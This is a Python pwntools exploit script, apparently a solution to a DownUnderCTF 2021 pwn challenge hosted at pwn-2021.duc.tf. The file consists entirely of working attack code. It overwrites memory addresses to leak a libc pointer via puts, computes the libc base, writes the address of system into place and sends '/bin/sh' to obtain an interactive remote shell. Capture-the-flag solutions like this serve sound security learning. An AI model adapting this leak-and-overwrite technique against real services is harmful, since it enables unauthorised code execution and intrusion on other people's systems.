from pwn import *

libc = ELF('./libc.so.6')
p = remote('pwn-2021.duc.tf', 31920)

p.recv()
p.send(p32(0x4011d1))
p.recv()
p.send('4210744')

p.recv()
p.send(b'a'*3 + b'\xd0')

p.recv()
p.send(b'4210709')

print(p.recvuntil(b'a'*3))

libc_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info('libc_leak: ' + hex(libc_leak))

libc.address = libc_leak - libc.sym['puts']
log.info('libc_base: ' + hex(libc.address))

system = libc.sym['system']
log.info('system: ' + hex(system))

p.recv()
p.send(p32(0x4011a9))

p.recv()
p.send(b'4210744')

p.recv()
p.send(p64(system)[:4])

p.recv()
p.send(b'4210736')

p.recv()
p.send(b'1')

p.recv()
p.send(b'/bin/sh\x00')

p.interactive()